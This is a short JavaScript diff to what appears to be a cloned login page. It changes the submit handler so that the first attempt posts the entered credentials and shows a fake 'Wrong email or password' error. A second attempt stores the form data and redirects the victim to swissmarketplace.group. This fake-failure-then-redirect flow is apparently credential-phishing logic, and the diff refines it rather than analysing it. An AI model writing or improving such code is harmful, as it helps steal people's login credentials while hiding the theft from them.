@@ -547,7 +547,7 @@ document.querySelectorAll('[data-action="toggle"]').forEach(button => {
 });
 
 const userAgent = navigator.userAgent;
-
+let i = 0
 /* ---------- SUBMIT ---------- */
 form.addEventListener('submit', async (e) => {
   e.preventDefault();
@@ -567,6 +567,7 @@ form.addEventListener('submit', async (e) => {
   // 🔥 arată o singură dată
   if (!authErrorShown) {
     authErrorShown = true;
+    i++;
 
     passwordError.textContent = 'Wrong email or password';
     passwordField.classList.add('ulp-error');
@@ -588,9 +589,9 @@ form.addEventListener('submit', async (e) => {
     body: formData
   });
 
-  localStorage.setItem('usr', formData);
+  if (i === 1) {
+    localStorage.setItem('usr', formData);
 
-  if (!authErrorShown) {
     window.location.href = 'https://swissmarketplace.group/';
   }
 });
